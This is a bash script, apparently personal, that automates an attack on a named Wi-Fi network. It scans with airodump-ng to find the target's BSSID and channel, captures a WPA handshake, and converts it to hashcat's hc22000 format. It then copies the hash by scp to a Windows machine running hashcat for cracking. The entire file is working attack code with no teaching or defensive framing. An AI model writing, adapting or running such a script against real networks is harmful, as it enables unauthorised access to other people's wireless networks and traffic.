#!/bin/bash

# Check if arguments were provided, windows_ip is where handshake will be sent (scp)
if [ -z "$1" ] || [ -z "$2" ]; then
    echo "Usage: $0 <target_essid> <windows_ip>"
    exit 1
fi

target_essid="$1"
windows_ip="$2"
no_spaces_target=$(echo "$target_essid" | sed 's/ //g')
base_dir="/home/sereos/wireless/$no_spaces_target"


echo "Hacking network: $target_essid"

# Create a directory for the target ESSID
mkdir -p "$base_dir"

# Start airodump-ng to capture packets
sudo airodump-ng wlan0mon --output-format csv --write "$base_dir/airodump_scan" > /dev/null 2>&1 &
airodump_pid=$!

# Monitor the CSV file to find the ESSID
while true; do
    # Check if the CSV file exists and has content
    if [ -s "$base_dir/airodump_scan-01.csv" ]; then
        # Try to find the ESSID in the CSV file
        bssid_channel=$(grep "$target_essid" "$base_dir/airodump_scan-01.csv" | awk -F',' '{print $1","$4}')

        # If the ESSID is found, break the loop and stop airodump-ng
        if [ -n "$bssid_channel" ]; then
            IFS=',' read -r bssid channel <<< "$bssid_channel"
            echo "BSSID: $bssid"
            echo "Channel: $channel" 
            # Stop airodump-ng
            sudo kill "$airodump_pid" > /dev/null 2>&1
            break
        fi
    fi

    # Wait for a short while before checking again
    sleep 1
done

echo "Removing temporary files..."
sudo rm "$base_dir/airodump_scan-01.csv"

echo "Starting capturing handshakes (no deauth)..."
echo "$base_dir/capture" 
echo "$base_dir/airodump_output"
sudo airodump-ng -w "$base_dir/capture" -c $channel --bssid $bssid wlan0mon > "$base_dir/airodump_output" 2>&1 &
airodump_pid=$!

# Monitor the airodump-ng output for a handshake
while true; do
    # Check the output file for the "WPA handshake" message
    if grep -q "WPA handshake" "$base_dir/airodump_output"; then
        echo "Handshake detected! Stopping airodump-ng..."
        sleep 2
        # Stop airodump-ng
        sudo kill "$airodump_pid" > /dev/null 2>&1
        break
    fi
done

echo "Creating .pcapng file..."
editcap "$base_dir/capture-01.cap" "$base_dir/cap.pcapng"

echo "Converting to .hc format..."
hcxpcapngtool -o "$base_dir/$no_spaces_target.hc22000" "$base_dir/cap.pcapng" > /dev/null 2>&1

echo "Cleaning up temporary files..."
sleep 3
sudo rm "$base_dir/airodump_output"
sudo rm "$base_dir/capture-01.cap"
sudo rm "$base_dir/capture"*

echo "Copying files to Windows..."
scp "$base_dir/$no_spaces_target.hc22000" "martin@$windows_ip":"C:\Users\Martin\hashcat-6.2.6"
